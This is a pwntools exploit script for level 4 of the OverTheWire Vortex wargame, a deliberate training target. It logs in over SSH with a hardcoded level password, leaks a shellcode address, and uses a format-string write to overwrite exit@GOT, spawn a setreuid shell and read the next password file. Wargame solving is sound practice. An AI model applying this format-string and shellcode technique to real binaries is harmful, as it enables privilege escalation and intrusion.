from pwn import *
from libformatstr import FormatStr
from pwnlib.util.fiddling import hexdump_iter
import pwnlib.log


context.arch = 'i386'
context.os = 'linux'

s = ssh(host='vortex.labs.overthewire.org', user='vortex4', password='2YmgK1=jw')
s.download_file('/vortex/vortex4')

s.upload_file('level4.c', remote='/tmp/level4.c')
s.run_to_end('gcc -m32 -o /tmp/v4 /tmp/level4.c', wd='/tmp')

s.upload_file('leaker.c', remote='/tmp/leaker.c')
s.run_to_end('gcc -m32 -o /tmp/leaker /tmp/leaker.c', wd='/tmp')

shellcode = asm(shellcraft.nop() * 100 + shellcraft.setreuid() + shellcraft.sh())

# leak shellcode address
with s.run("/tmp/v4 /tmp/leaker '{}' '{}'".format(shellcode, '')) as p:
    sc = int(p.recv().strip(), base=16) + 20

# dump stack
# there are four reasonable paddings, later it wraps around
stackdump = '%x\n' * 0x200
magic = '41414141'
offset = None
padding = None
for pad in xrange(4):
    with s.run("/tmp/v4 /vortex/vortex4 '{}' '{}'".format(shellcode + 'x'*pad, 'AAAA' + stackdump)) as p:
        r = p.recvall().splitlines()

    if magic in r:
        offset = r.index(magic)
        padding = pad
        break

if offset is None or padding is None:
    log.error('Unable to find correct offset or padding')

# prepare format string
f = FormatStr()
exe = ELF('vortex4')
exit = exe.got['exit']
f[exit] = sc

payload = f.payload(offset)

# uncomment to print addresses instead of writing to them
payload = re.sub('hn', '8x', payload)

log.info('exit@got: {}'.format(hex(exit)))
log.info('sc: {}'.format(hex(sc)))
log.info('Offset: {}'.format(offset))
log.info('Padding: {}'.format(padding))
log.info('Payload: {}'.format(repr(payload)))

with s.run("/tmp/v4 /vortex/vortex4 '{}' '{}'".format(shellcode + 'x'*padding, payload)) as p:
    more(hexdump(p.recvall()))

    p.clean()
    p.send('cat /etc/vortex_pass/vortex4\n')
    log.success('Password: {}'.format(p.recv()))
